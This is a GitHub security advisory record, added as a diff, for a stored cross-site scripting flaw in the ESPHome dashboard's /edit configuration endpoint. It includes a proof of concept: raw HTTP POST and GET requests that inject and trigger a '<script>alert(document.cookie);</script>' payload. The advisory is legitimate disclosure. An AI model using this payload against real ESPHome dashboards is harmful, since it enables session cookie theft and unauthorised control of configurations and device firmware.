@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-9p43-hj5j-96h5",
+  "modified": "2024-03-06T15:28:21Z",
+  "published": "2024-03-06T15:28:21Z",
+  "aliases": [
+    "CVE-2024-27287"
+  ],
+  "summary": "esphome vulnerable to stored Cross-site Scripting in edit configuration file API",
+  "details": "### Summary\nEdit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation and Home Assistant add-on) serves unsanitized data with “Content-Type: text/html; charset=UTF-8”, allowing remote authenticated user to inject arbitrary web script and exfiltrate session cookies via Cross-Site scripting (XSS).\n\n### Credits\nSpike Reply Cybersecurity Teams\n\n### Details\nIt is possible for a malicious authenticated user to inject arbitrary Javascript in configuration files using a POST request to the /edit endpoint, the configuration parameter allows to specify the file to write. \n\nTo trigger the XSS vulnerability, the victim must visit the page /edit?configuration=[xss file].\n\n### PoC\n\nTo reproduce the issue, it is possible to perform a POST request to inject the payload:\n\nrequest:\nPOST /edit?configuration=xss.yaml HTTP/1.1\nHost: localhost:6052\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost:6052/\nConnection: close\nCookie: authenticated=[replace with valid cookie]\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nContent-Length: 40\n \n<script>alert(document.cookie);</script>\n\n__________________________\n\nresponse:\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Thu, 30 Nov 2023 11:02:27 GMT\nContent-Length: 0\nConnection: close\n\nAnd subsequently trigger the XSS with a GET request to the same endpoint:\n\nrequest:\nGET /edit?configuration=xss.yaml HTTP/1.1\nHost: localhost:6052\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost:6052/\nConnection: close\nCookie: authenticated=2|1:0|10:1701341719|13:authenticated|4:eWVz|0907127d7274094cc5a2490b95becf5c11fd52b8c3ee3655d65fe9fda099108c\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nContent-Length: 0\n\n________________________________\n\nresponse:\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Thu, 30 Nov 2023 11:04:12 GMT\nEtag: \"ec6c9889f5c9a6c8e9d2d5e4ce1b1a85e6e7da2b\"\nContent-Length: 40\nConnection: close\n \n<script>alert(document.cookie);</script>\n\n\n### Impact\nAbusing this vulnerability a malicious actor could perform operations on the dashboard on the behalf of a logged user, access sensitive information, create, edit and delete configuration files and flash firmware on managed boards.\nIn addition to this, cookies are not correctly secured, allowing the exfiltration of session cookie values.\n\n### Credits\nSpike Reply Cybersecurity Team\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "esphome"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2023.12.9"
+            },
+            {
+              "fixed": "2024.2.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/esphome/esphome/security/advisories/GHSA-9p43-hj5j-96h5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/esphome/esphome/commit/37d2b3c7977a4ccbec59726ca7549cb776661455"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/esphome/esphome"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-06T15:28:21Z",
+    "nvd_published_at": null
+  }
+}
